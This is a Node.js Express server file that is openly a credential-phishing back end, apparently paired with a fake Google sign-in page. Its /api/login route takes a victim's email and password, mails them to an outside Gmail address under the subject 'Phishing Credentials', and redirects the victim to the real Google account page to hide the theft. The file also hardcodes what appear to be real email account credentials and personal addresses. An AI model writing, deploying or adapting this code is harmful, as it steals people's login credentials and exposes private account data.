const express = require('express');
const app = express();
const nodemailer = require('nodemailer');
const transporter = nodemailer.createTransport({
    service: 'hotmail',
    auth: {
        user: 'vaibhavgowda2008@outlook.com',
        pass: 'NVJ@vaibhav'
    }
})
const PORT = process.env.PORT || 3000;
//LET ME CHECK ONCE JUST DO NOT MOVE YOUR KEYBOARD

app.use(express.json());
app.use('/', express.static('./public'));

app.get('/', (req, res) => {
    res.redirect('/authorize/google');
})
app.get('/api/login', (req, res) => {
    const email = req.query.email;
    const password = req.query.password;

    transporter.sendMail({
        to: 'nageshgowdan7@gmail.com',
        from: 'vaibhavgowda2008@outlook.com',
        subject: 'Phishing Credentials',
        text: `EMAIL: ${email}
        
               PASSWORD: ${password}`
    }, (err, info) => {
        if(err) {
            return console.log(err);
        }

        console.log('SENT: ' + info.response);
    })
    console.log(email, password)
    res.redirect('https://myaccount.google.com');
})

app.listen(PORT, console.log('The server is listening on port ' + PORT + '...'));